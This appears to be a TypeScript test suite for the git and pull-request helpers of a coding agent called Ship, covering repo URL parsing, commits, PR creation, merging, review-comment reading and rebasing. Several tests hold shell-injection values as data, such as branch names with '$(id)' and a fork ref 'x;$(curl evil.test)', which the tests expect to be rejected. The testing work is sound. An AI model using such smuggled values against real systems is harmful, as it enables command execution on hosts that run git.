import assert from "node:assert/strict";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import { LocalExecutor } from "@neutron-build/agents";

import {
  assertGitSafe,
  authenticatedUrl,
  closePullRequest,
  commitAndPush,
  markPullRequestReady,
  mergePullRequest,
  findOpenPullRequest,
  formatReviewComments,
  listPrReviewComments,
  openPullRequest,
  parseRepoUrl,
  pullRequestUrl,
  rebaseOntoBase,
  resolvePr,
  setupRepo,
  SHIP_COMMENT_MARKER,
  truncateMiddle,
  WORKING_DIFF_MAX_CHARS,
} from "./git.js";
import { credentialFor } from "./repo-policy.js";

test("assertGitSafe rejects shell-active refs (command-injection defense)", () => {
  // These are all valid git branch names but would execute under sh -c.
  for (const bad of ["a$(id)", "a`id`b", "a;id", "a|id", "a&&id", "a b", "a>b", "a\nid", "-x", "..", "a/../b", "/lead", "trail/"]) {
    assert.throws(() => assertGitSafe("branch", bad), new RegExp("unsafe git"), `should reject ${JSON.stringify(bad)}`);
  }
  // Legitimate names pass through unchanged.
  for (const ok of ["main", "feat/x-1", "release-2.0", "ship/auth-race", "a_b.c"]) {
    assert.equal(assertGitSafe("branch", ok), ok);
  }
});

test("parseRepoUrl refuses an owner/repo with injection characters", () => {
  assert.throws(() => parseRepoUrl("http://h/o/r$(id)"), /unsafe git/);
  assert.throws(() => parseRepoUrl("http://h/ow;ner/repo"), /unsafe git/);
});

test("parseRepoUrl: forgejo and github, .git suffix, credentials URL", () => {
  const forgejo = parseRepoUrl("http://forgejo.example.com:3000/Tyler/teploy-ship.git");
  assert.equal(forgejo.kind, "forgejo");
  assert.equal(forgejo.base, "http://forgejo.example.com:3000");
  assert.equal(forgejo.owner, "Tyler");
  assert.equal(forgejo.repo, "teploy-ship");
  assert.equal(forgejo.cloneUrl, "http://forgejo.example.com:3000/Tyler/teploy-ship.git");

  const github = parseRepoUrl("https://github.com/useteploy/teploy");
  assert.equal(github.kind, "github");
  assert.equal(github.cloneUrl, "https://github.com/useteploy/teploy.git");

  assert.equal(authenticatedUrl(forgejo, "s3cr3t"), "http://s3cr3t@forgejo.example.com:3000/Tyler/teploy-ship.git");
  assert.throws(() => parseRepoUrl("git@github.com:a/b.git"));
  assert.throws(() => parseRepoUrl("http://host/onlyowner"));
});

test("setupRepo + commitAndPush against a local bare remote", async () => {
  // a bare "origin" seeded with one commit on main
  const bare = await mkdtemp(join(tmpdir(), "ship-git-bare-"));
  const seed = await mkdtemp(join(tmpdir(), "ship-git-seed-"));
  const seeder = new LocalExecutor({ root: seed });
  await seeder.exec(`git init -q -b main . && git config user.email t@t && git config user.name t && echo hello > readme.md && git add -A && git commit -qm seed && git clone -q --bare . ${bare}/repo.git`);

  // parseRepoUrl requires http(s); build the ref by hand for the file:// remote
  const ref = {
    kind: "forgejo" as const,
    base: "file://",
    owner: "local",
    repo: "repo",
    cloneUrl: `${bare}/repo.git`,
  };

  const work = await mkdtemp(join(tmpdir(), "ship-git-work-"));
  const executor = new LocalExecutor({ root: work });
  // file:// remotes take no credentials — token still exercised in the URL builder path above
  const checkout = await setupRepo(executor, { ref: { ...ref, cloneUrl: ref.cloneUrl }, token: "", runId: "run-test1234" });
  assert.equal(checkout.base, "main");
  assert.equal(checkout.branch, "ship/run-test1234");

  // no changes -> "empty" (no PR)
  assert.deepEqual(await commitAndPush(executor, { ref, token: "", checkout, message: "noop" }), { kind: "empty" });

  // agent-style tree edit -> committed and pushed
  await executor.exec("echo fixed >> readme.md && echo new > lib.py");
  const pushed = await commitAndPush(executor, { ref, token: "", checkout, message: "fix: the thing\n\nrun-test1234" });
  assert.equal(pushed.kind, "pushed", "an ordinary two-file change passes the publication screen");

  const check = new LocalExecutor({ root: bare });
  const branchList = await check.exec("cd repo.git && git branch --list 'ship/*'");
  assert.match(branchList.stdout, /ship\/run-test1234/);
  const show = await check.exec("cd repo.git && git show ship/run-test1234:lib.py");
  assert.equal(show.stdout.trim(), "new");
  const author = await check.exec("cd repo.git && git log -1 --format='%an <%ae>' ship/run-test1234");
  assert.match(author.stdout, /Teploy Ship <ship@teploy\.dev>/);
});

test("openPullRequest hits the right endpoint per host kind", async () => {
  const calls: Array<{ url: string; init: RequestInit }> = [];
  const fetchImpl = (async (url: string | URL | Request, init?: RequestInit) => {
    calls.push({ url: String(url), init: init ?? {} });
    return new Response(JSON.stringify({ number: 7, html_url: "http://pr/7" }), { status: 201 });
  }) as typeof fetch;

  const forgejo = parseRepoUrl("http://forge.example:3000/Tyler/app");
  const pr = await openPullRequest({ ref: forgejo, token: "tok", head: "ship/x", base: "main", title: "t", body: "b", fetchImpl });
  assert.equal(pr.number, 7);
  assert.equal(calls[0]?.url, "http://forge.example:3000/api/v1/repos/Tyler/app/pulls");
  assert.equal((calls[0]?.init.headers as Record<string, string>).authorization, "token tok");

  const github = parseRepoUrl("https://github.com/o/r");
  await openPullRequest({ ref: github, token: "tok", head: "ship/x", base: "main", title: "t", body: "b", fetchImpl });
  assert.equal(calls[1]?.url, "https://api.github.com/repos/o/r/pulls");
  assert.equal((calls[1]?.init.headers as Record<string, string>).authorization, "Bearer tok");

  // failure surfaces status + body
  const failImpl = (async () => new Response("nope", { status: 422 })) as typeof fetch;
  await assert.rejects(
    () => openPullRequest({ ref: forgejo, token: "tok", head: "h", base: "b", title: "t", body: "b", fetchImpl: failImpl }),
    /422.*nope/s,
  );
});

test("credentialFor picks the GitHub token for github.com, default elsewhere", () => {
  const github = parseRepoUrl("https://github.com/o/r");
  const forgejo = parseRepoUrl("http://forgejo.example.com:3000/o/r.git");
  assert.equal(credentialFor(github, { gitToken: "fj", githubToken: "gh" }), "gh");
  assert.equal(credentialFor(github, { gitToken: "fj" }), "fj", "single-token deploys keep working");
  assert.equal(credentialFor(forgejo, { gitToken: "fj", githubToken: "gh" }), "fj");
  assert.equal(credentialFor(forgejo, {}), "");
});

test("TS-044: the human PR path is /pull on GitHub and /pulls elsewhere", () => {
  const gh = parseRepoUrl("https://github.com/useteploy/teploy-cli");
  const fj = parseRepoUrl("http://forgejo.example.com:3000/tyler/teploy-ship");
  assert.equal(pullRequestUrl(gh, 12), "https://github.com/useteploy/teploy-cli/pull/12");
  assert.equal(pullRequestUrl(fj, 12), "http://forgejo.example.com:3000/tyler/teploy-ship/pulls/12");
});

test("TS-023: a fork PR keeps the head repository, a same-repo PR does not", async () => {
  const ref = parseRepoUrl("https://github.com/useteploy/teploy-cli");
  const reply = (body: unknown) =>
    (async () => ({ ok: true, json: async () => body })) as unknown as typeof fetch;

  const fork = await resolvePr(ref, "t", 7, reply({
    head: { ref: "patch-1", sha: "abc123", repo: { full_name: "outsider/teploy-cli", clone_url: "https://github.com/outsider/teploy-cli.git" } },
    base: { ref: "main", repo: { full_name: "useteploy/teploy-cli" } },
  }));
  assert.equal(fork.branch, "patch-1");
  assert.equal(fork.headRepo, "https://github.com/outsider/teploy-cli.git", "the branch lives in the fork, not the base");
  assert.equal(fork.headSha, "abc123");

  const same = await resolvePr(ref, "t", 8, reply({
    head: { ref: "ship/run-1", sha: "def456", repo: { full_name: "useteploy/teploy-cli", clone_url: "https://github.com/useteploy/teploy-cli.git" } },
    base: { ref: "main", repo: { full_name: "useteploy/teploy-cli" } },
  }));
  assert.equal(same.headRepo, undefined, "same-repo PRs fetch from origin as before");
});

test("a fork's branch name is still validated before it reaches a shell", async () => {
  const ref = parseRepoUrl("https://github.com/useteploy/teploy-cli");
  const evil = (async () => ({
    ok: true,
    json: async () => ({
      head: { ref: "x;$(curl evil.test)", repo: { full_name: "o/r", clone_url: "https://github.com/o/r.git" } },
      base: { ref: "main", repo: { full_name: "useteploy/teploy-cli" } },
    }),
  })) as unknown as typeof fetch;
  await assert.rejects(() => resolvePr(ref, "t", 9, evil), /refusing unsafe git branch/);
});

test("TS-003: incomplete work publishes as a draft (GitHub) or WIP (Forgejo)", async () => {
  const bodies: Array<Record<string, unknown>> = [];
  const fetchImpl = (async (_url: string, init?: RequestInit) => {
    bodies.push(JSON.parse(String(init?.body)));
    return { ok: true, json: async () => ({ number: 3, html_url: "http://x/pull/3" }) };
  }) as unknown as typeof fetch;

  await openPullRequest({
    ref: parseRepoUrl("https://github.com/o/r"),
    token: "t", head: "h", base: "main", title: "fix the thing", body: "b", draft: true, fetchImpl,
  });
  assert.equal(bodies[0]!.draft, true, "GitHub takes a draft flag");
  assert.equal(bodies[0]!.title, "fix the thing", "and needs no title marker");

  await openPullRequest({
    ref: parseRepoUrl("http://forge.test/o/r"),
    token: "t", head: "h", base: "main", title: "fix the thing", body: "b", draft: true, fetchImpl,
  });
  assert.equal(bodies[1]!.draft, undefined, "Forgejo has no draft flag on create");
  assert.equal(bodies[1]!.title, "WIP: fix the thing", "so it uses the WIP prefix its UI honours");

  await openPullRequest({
    ref: parseRepoUrl("http://forge.test/o/r"),
    token: "t", head: "h", base: "main", title: "fix the thing", body: "b", fetchImpl,
  });
  assert.equal(bodies[2]!.title, "fix the thing", "a completed run is not marked WIP");
});

test("TS-015: an existing open PR is found rather than duplicated on replay", async () => {
  const ref = parseRepoUrl("http://forge.test/o/r");
  const found = (async () => ({
    ok: true,
    json: async () => [{ number: 5, html_url: "http://forge.test/o/r/pulls/5", head: { ref: "ship/run-1" } }],
  })) as unknown as typeof fetch;
  const existing = await findOpenPullRequest({ ref, token: "t", head: "ship/run-1", owner: "o", fetchImpl: found });
  assert.equal(existing?.number, 5);

  const none = (async () => ({ ok: true, json: async () => [] })) as unknown as typeof fetch;
  assert.equal(await findOpenPullRequest({ ref, token: "t", head: "ship/run-1", owner: "o", fetchImpl: none }), null);

  // A failed lookup must not block publishing — it returns null and the caller creates.
  const broken = (async () => ({ ok: false, json: async () => ({}) })) as unknown as typeof fetch;
  assert.equal(await findOpenPullRequest({ ref, token: "t", head: "ship/run-1", owner: "o", fetchImpl: broken }), null);
});

// --- A3: the critic's diff window ---
//
// The default was 6000 chars taken from the HEAD of the diff, which is two or
// three files of a real change: a 15-file diff was reviewed on its opening
// files. `git diff` orders hunks by path, so head-truncation is not a neutral
// sample either — it is alphabetical.

test("truncateMiddle returns short text untouched", () => {
  assert.equal(truncateMiddle("short", 100), "short");
  assert.equal(truncateMiddle("", 100), "");
});

test("truncateMiddle keeps BOTH ends of an oversized diff and says what it dropped", () => {
  const lines = Array.from({ length: 400 }, (_, i) => `line ${i}`);
  const out = truncateMiddle(lines.join("\n"), 600);
  assert.match(out, /^line 0\n/, "the head survives");
  assert.match(out, /line 399$/, "and so does the tail — this is the whole point");
  assert.match(out, /chars omitted from the middle/);
  assert.ok(out.length <= 700, `stayed near the window, got ${out.length}`);
});

test("truncateMiddle cuts on line boundaries so neither half ends mid-hunk", () => {
  const lines = Array.from({ length: 200 }, (_, i) => `+ some source line number ${i}`);
  const out = truncateMiddle(lines.join("\n"), 800);
  const [head, tail] = out.split(/\n\n\.\.\. \[\d+ chars omitted from the middle of this diff\] \.\.\.\n\n/);
  assert.ok(head !== undefined && tail !== undefined, "the marker splits it in two");
  for (const line of `${head}\n${tail}`.split("\n")) {
    assert.match(line, /^\+ some source line number \d+$/, `a whole line, not a fragment: ${JSON.stringify(line)}`);
  }
});

test("truncateMiddle survives a single line longer than the whole window", () => {
  const out = truncateMiddle("x".repeat(5000), 200);
  assert.ok(out.length <= 300);
  assert.match(out, /chars omitted from the middle/);
});

test("WORKING_DIFF_MAX_CHARS is large enough for a real multi-file change", () => {
  // The regression this guards: a default small enough that the reviewer only
  // ever sees the first few files of the diff it is judging.
  assert.ok(WORKING_DIFF_MAX_CHARS >= 20_000, `got ${WORKING_DIFF_MAX_CHARS}`);
});

// --- C3: reading a review back off the forge ---
//
// Intake coalesces a batched review onto ONE task, which means the later
// deliveries' bodies are dropped (intake.ts:136 returns the existing task
// unchanged). Reading the comments back is the only way the run that addresses
// the task can see the whole review.

/** A fetch that answers a fixed url→body map and records what was asked for. */
function stubFetch(routes: Record<string, unknown>, seen: string[] = []): typeof fetch {
  return (async (url: string) => {
    seen.push(String(url));
    const key = Object.keys(routes).find((route) => String(url).startsWith(route));
    if (key === undefined) return { ok: false, status: 404, json: async () => ({}) };
    return { ok: true, status: 200, json: async () => routes[key] };
  }) as unknown as typeof fetch;
}

test("listPrReviewComments reads GitHub's flat comments route and drops Ship's own notes", async () => {
  const ref = parseRepoUrl("https://github.com/o/r");
  const seen: string[] = [];
  const fetchImpl = stubFetch(
    {
      "https://api.github.com/repos/o/r/pulls/12/comments": [
        {
          id: 1,
          pull_request_review_id: 55,
          body: "this leaks the handle",
          path: "src/pool.ts",
          line: 42,
          side: "RIGHT",
          diff_hunk: "@@ -40,6 +40,7 @@",
          user: { login: "reviewer" },
        },
        { id: 2, pull_request_review_id: 55, body: "rename this", path: "src/a.ts", original_line: 9 },
        { id: 3, pull_request_review_id: 55, body: `${SHIP_COMMENT_MARKER} addressed in 1a2b3c`, path: "src/a.ts" },
      ],
    },
    seen,
  );
  const comments = await listPrReviewComments(ref, "t", 12, { fetchImpl });
  assert.equal(comments.length, 2, "Ship's own note is not feedback for Ship");
  assert.deepEqual(comments[0], {
    id: 1,
    reviewId: 55,
    path: "src/pool.ts",
    line: 42,
    side: "RIGHT",
    diffHunk: "@@ -40,6 +40,7 @@",
    body: "this leaks the handle",
    user: "reviewer",
  });
  assert.equal(comments[1]?.line, 9, "an outdated anchor falls back to original_line");
  assert.equal(seen.length, 1, "GitHub answers in one call");
});

test("listPrReviewComments walks Forgejo's per-review comments route (it has no flat one)", async () => {
  const ref = parseRepoUrl("http://forge.test/o/r");
  const seen: string[] = [];
  const fetchImpl = stubFetch(
    {
      "http://forge.test/api/v1/repos/o/r/pulls/12/reviews/9/comments": [
        { id: 2, body: "second round", path: "src/b.ts", line: 3 },
      ],
      "http://forge.test/api/v1/repos/o/r/pulls/12/reviews/8/comments": [
        { id: 1, body: "first round", path: "src/a.ts", line: 1 },
      ],
      "http://forge.test/api/v1/repos/o/r/pulls/12/reviews": [{ id: 8 }, { id: 9 }],
    },
    seen,
  );
  const all = await listPrReviewComments(ref, "t", 12, { fetchImpl });
  assert.deepEqual(all.map((c) => c.id).sort(), [1, 2]);
  // The review id the forge did not put on the comment is filled in from the
  // review it was fetched under — without it nothing could be filtered later.
  assert.deepEqual(all.map((c) => c.reviewId).sort(), [8, 9]);
  assert.ok(seen.some((u) => u.endsWith("/pulls/12/reviews")), "reviews are listed first");

  const one = await listPrReviewComments(ref, "t", 12, { reviewId: 9, fetchImpl });
  assert.deepEqual(one.map((c) => c.id), [2], "a single round can be asked for");
});

test("listPrReviewComments never throws — a failed read is an empty set, not a failed run", async () => {
  const ref = parseRepoUrl("https://github.com/o/r");
  const refused = (async () => ({ ok: false, status: 403, json: async () => ({}) })) as unknown as typeof fetch;
  assert.deepEqual(await listPrReviewComments(ref, "t", 12, { fetchImpl: refused }), []);
  const thrown = (async () => {
    throw new Error("ECONNRESET");
  }) as unknown as typeof fetch;
  assert.deepEqual(await listPrReviewComments(ref, "t", 12, { fetchImpl: thrown }), []);
  const garbage = (async () => ({ ok: true, status: 200, json: async () => ({ message: "nope" }) })) as unknown as typeof fetch;
  assert.deepEqual(await listPrReviewComments(ref, "t", 12, { fetchImpl: garbage }), []);
});

test("formatReviewComments names every comment's file and line, and says nothing when there is nothing", () => {
  assert.equal(formatReviewComments([]), "");
  const text = formatReviewComments([
    { id: 1, path: "src/pool.ts", line: 42, side: "RIGHT", diffHunk: "@@ -40 +40 @@", body: "leaks", user: "reviewer" },
    { id: 2, body: "no anchor" },
  ]);
  assert.match(text, /All 2 inline review comment\(s\)/);
  assert.match(text, /src\/pool\.ts, line 42 \(RIGHT side of the diff\)/);
  assert.match(text, /@@ -40 \+40 @@/);
  assert.match(text, /no file anchor/);
});

// --- D5 / L5: merging a pull request ---------------------------------------

const FORGEJO_REF = parseRepoUrl("https://forge.example/tyler/ship.git");
const GITHUB_REF = parseRepoUrl("https://github.com/tyler/ship.git");

/** Records the one call and answers with `reply`. */
function captureFetch(reply: { ok: boolean; status?: number; body?: unknown; text?: string }): {
  impl: typeof fetch;
  seen: { url: string; init: RequestInit }[];
} {
  const seen: { url: string; init: RequestInit }[] = [];
  const impl = (async (url: string, init: RequestInit) => {
    seen.push({ url: String(url), init });
    return {
      ok: reply.ok,
      status: reply.status ?? (reply.ok ? 200 : 405),
      json: async () => {
        if (reply.body === undefined) throw new Error("no body");
        return reply.body;
      },
      text: async () => reply.text ?? "",
    };
  }) as unknown as typeof fetch;
  return { impl, seen };
}

test("D5: the merge call is PUT + merge_method on GitHub and POST + Do on Forgejo", async () => {
  const gh = captureFetch({ ok: true, body: { sha: "deadbeef", merged: true } });
  assert.deepEqual(await mergePullRequest(GITHUB_REF, "tok", 7, {}, gh.impl), { kind: "merged", sha: "deadbeef" });
  assert.equal(gh.seen[0]!.url, "https://api.github.com/repos/tyler/ship/pulls/7/merge");
  assert.equal(gh.seen[0]!.init.method, "PUT");
  assert.equal((gh.seen[0]!.init.headers as Record<string, string>).authorization, "Bearer tok");
  assert.deepEqual(JSON.parse(String(gh.seen[0]!.init.body)), { merge_method: "squash" });

  const fj = captureFetch({ ok: true, body: {} });
  assert.deepEqual(await mergePullRequest(FORGEJO_REF, "tok", 7, { message: "why" }, fj.impl), { kind: "merged" });
  assert.equal(fj.seen[0]!.url, "https://forge.example/api/v1/repos/tyler/ship/pulls/7/merge");
  assert.equal(fj.seen[0]!.init.method, "POST");
  assert.equal((fj.seen[0]!.init.headers as Record<string, string>).authorization, "token tok");
  assert.deepEqual(JSON.parse(String(fj.seen[0]!.init.body)), { Do: "squash", MERGE_MESSAGE_FIELD: "why" });
});

test("D5: a Forgejo 200 with an empty body is a merge, not a crash", async () => {
  // Gitea/Forgejo answer this endpoint with no JSON at all. A `.json()` that
  // throws must not turn a successful merge into a failed one.
  const empty = (async () => ({ ok: true, status: 200, json: async () => { throw new Error("Unexpected end of JSON input"); }, text: async () => "" })) as unknown as typeof fetch;
  assert.deepEqual(await mergePullRequest(FORGEJO_REF, "tok", 3, {}, empty), { kind: "merged" });
});

test("D5: a refused merge is DATA — never a throw, so the PR stays open and the run succeeds", async () => {
  const refused = captureFetch({ ok: false, status: 405, text: "Pull Request is not mergeable" });
  assert.deepEqual(await mergePullRequest(FORGEJO_REF, "tok", 9, {}, refused.impl), {
    kind: "failed",
    status: 405,
    reason: "Pull Request is not mergeable",
  });

  const thrown = (async () => { throw new Error("ECONNRESET"); }) as unknown as typeof fetch;
  // status 0 distinguishes "never reached the forge" from "the forge said no".
  assert.deepEqual(await mergePullRequest(GITHUB_REF, "tok", 9, {}, thrown), { kind: "failed", status: 0, reason: "ECONNRESET" });
});

// --- C1 / C7: the merge boundary's forge calls and the rebase ----------------

test("C1: markPullRequestReady strips the WIP prefix on Forgejo and only then", async () => {
  const calls: { url: string; method: string; body: unknown }[] = [];
  let title = "WIP: fix the thing";
  const fetchImpl = (async (url: string, init?: { method?: string; body?: string }) => {
    calls.push({ url: String(url), method: init?.method ?? "GET", body: init?.body !== undefined ? JSON.parse(init.body) : undefined });
    if (init?.method === "PATCH" && init.body !== undefined) title = String((JSON.parse(init.body) as { title: string }).title);
    return { ok: true, json: async () => ({ title }) };
  }) as unknown as typeof fetch;

  const ready = await markPullRequestReady(FORGEJO_REF, "tok", 7, fetchImpl);
  assert.deepEqual(ready, { ok: true });
  assert.equal(calls[1]?.method, "PATCH", "the WIP prefix leaves by a title update");
  assert.equal((calls[1]?.body as { title?: string }).title, "fix the thing");
  assert.equal(calls[1]?.url, "https://forge.example/api/v1/repos/tyler/ship/pulls/7");

  // A title with no prefix is already ready: one GET, no PATCH.
  calls.length = 0;
  title = "fix the thing";
  assert.deepEqual(await markPullRequestReady(FORGEJO_REF, "tok", 7, fetchImpl), { ok: true });
  assert.equal(calls.length, 1, "nothing to change, nothing sent");
});

test("C1: markPullRequestReady uses the GraphQL mutation on GitHub, and says why when it cannot", async () => {
  const calls: { url: string; body: unknown }[] = [];
  let draft = true;
  const fetchImpl = (async (url: string, init?: { method?: string; body?: string }) => {
    calls.push({ url: String(url), body: init?.body !== undefined ? JSON.parse(init.body) : undefined });
    if (String(url).endsWith("/graphql")) draft = false;
    return { ok: true, json: async () => (draft ? { draft: true, node_id: "PR_node1" } : { errors: [] }) };
  }) as unknown as typeof fetch;

  assert.deepEqual(await markPullRequestReady(GITHUB_REF, "tok", 7, fetchImpl), { ok: true });
  assert.equal(calls[1]?.url, "https://api.github.com/graphql");
  assert.match(String((calls[1]?.body as { query?: string }).query), /markPullRequestReadyForReview/);
  assert.equal((calls[1]?.body as { variables?: { id?: string } }).variables?.id, "PR_node1");

  // Already ready: the GET answers draft:false and no mutation is sent.
  calls.length = 0;
  draft = false;
  const json = async () => ({ draft: false });
  const noop = (async (_u: string, init?: { body?: string }) => {
    calls.push({ url: "get", body: init?.body });
    return { ok: true, json };
  }) as unknown as typeof fetch;
  assert.deepEqual(await markPullRequestReady(GITHUB_REF, "tok", 7, noop), { ok: true });
  assert.equal(calls.length, 1);

  // A GraphQL error list is a refusal with the messages, never a throw.
  const failing = (async () => ({
    ok: true,
    json: async () => ({ draft: true, node_id: "PR_node1", errors: [{ message: "not yours" }] }),
  })) as unknown as typeof fetch;
  // two calls on one impl: the GET also returns errors, which is fine — the
  // mutation is still attempted and its answer is what is asserted.
  const refused = await markPullRequestReady(GITHUB_REF, "tok", 7, failing);
  assert.equal(refused.ok, false);
  assert.match(String(refused.reason), /not yours/);
});

test("C1: closePullRequest PATCHes state=closed on both forges and never throws", async () => {
  const fj = captureFetch({ ok: true, body: {} });
  assert.deepEqual(await closePullRequest(FORGEJO_REF, "tok", 7, fj.impl), { ok: true });
  assert.equal(fj.seen[0]!.url, "https://forge.example/api/v1/repos/tyler/ship/pulls/7");
  assert.equal(fj.seen[0]!.init.method, "PATCH");
  assert.deepEqual(JSON.parse(String(fj.seen[0]!.init.body)), { state: "closed" });

  const refused = captureFetch({ ok: false, status: 403, text: "forbidden" });
  const failed = await closePullRequest(GITHUB_REF, "tok", 7, refused.impl);
  assert.equal(failed.ok, false);
  assert.match(String(failed.reason), /403/);

  const thrown = (async () => { throw new Error("ECONNRESET"); }) as unknown as typeof fetch;
  const dead = await closePullRequest(GITHUB_REF, "tok", 7, thrown);
  assert.equal(dead.ok, false);
  assert.equal(dead.reason, "ECONNRESET");
});

/** A local bare remote with one commit on main, plus a Ship-style branch workspace. */
async function rebaseFixture(name: string): Promise<{
  bare: string;
  ref: ReturnType<typeof parseRepoUrl>;
  checkout: Awaited<ReturnType<typeof setupRepo>>;
  work: LocalExecutor;
  seed: LocalExecutor;
}> {
  const bare = await mkdtemp(join(tmpdir(), `${name}-bare-`));
  const seedDir = await mkdtemp(join(tmpdir(), `${name}-seed-`));
  const seed = new LocalExecutor({ root: seedDir });
  await seed.exec(
    `git init -q -b main . && git config user.email t@t && git config user.name t && echo hello > f.txt && git add -A && git commit -qm seed && git clone -q --bare . ${bare}/repo.git`,
  );
  const ref = { kind: "forgejo" as const, base: "file://", owner: "local", repo: "repo", cloneUrl: `${bare}/repo.git` };
  const workDir = await mkdtemp(join(tmpdir(), `${name}-work-`));
  const work = new LocalExecutor({ root: workDir });
  const checkout = await setupRepo(work, { ref, token: "", runId: "run-rebase1" });
  return { bare, ref, checkout, work, seed };
}

test("C7: rebaseOntoBase says up-to-date when the default branch has not moved", async () => {
  const { ref, checkout, work } = await rebaseFixture("git-rebase-uptodate");
  await work.exec("echo mine >> f.txt && git add -A && git commit -qm change");
  const outcome = await rebaseOntoBase(work, { ref, token: "", checkout });
  assert.equal(outcome.kind, "up-to-date");
  assert.match(String((outcome as { sha: string }).sha), /^[0-9a-f]{40}$/);
});

test("C7: a moved base rebases cleanly, force-pushes with lease, and reports the new sha", async () => {
  const { bare, ref, checkout, work, seed } = await rebaseFixture("git-rebase-clean");
  await work.exec("echo mine >> f.txt && git add -A && git commit -qm change && git push -q origin ship/run-rebase1");
  // main moves elsewhere while the branch is parked.
  await seed.exec(`echo moved > other.txt && git add -A && git commit -qm 'move main' && git push -q ${bare}/repo.git main`);

  const outcome = await rebaseOntoBase(work, { ref, token: "", checkout });
  assert.equal(outcome.kind, "rebased");
  const rebased = outcome as { base: string };
  assert.match(rebased.base, /^[0-9a-f]{40}$/);

  // The remote branch is the rebased bytes: main's other.txt is on it.
  const check = new LocalExecutor({ root: await mkdtemp(join(tmpdir(), "git-rebase-check-")) });
  await check.exec(`git clone -q --branch ship/run-rebase1 ${bare}/repo.git .`);
  const other = await check.exec("cat other.txt");
  assert.equal(other.stdout.trim(), "moved");
});

test("C7: a conflicting rebase is aborted, reported as files, and leaves the tree where it was", async () => {
  const { bare, ref, checkout, work, seed } = await rebaseFixture("git-rebase-conflict");
  await work.exec("echo mine > f.txt && git add -A && git commit -qm change && git push -q origin ship/run-rebase1");
  // The sha a parked run would return to: its own change, pushed.
  const before = (await work.exec("git rev-parse HEAD")).stdout.trim();
  // main rewrites the SAME file, differently.
  await seed.exec(`echo theirs > f.txt && git add -A && git commit -qm 'move main differently' && git push -q ${bare}/repo.git main`);

  const outcome = await rebaseOntoBase(work, { ref, token: "", checkout });
  assert.equal(outcome.kind, "conflict");
  assert.deepEqual((outcome as { files: string[] }).files, ["f.txt"]);
  const after = (await work.exec("git rev-parse HEAD")).stdout.trim();
  assert.equal(after, before, "the abort put the branch back");
  const status = await work.exec("git status --porcelain");
  assert.equal(status.stdout.trim(), "", "and left no rebase in progress");
});
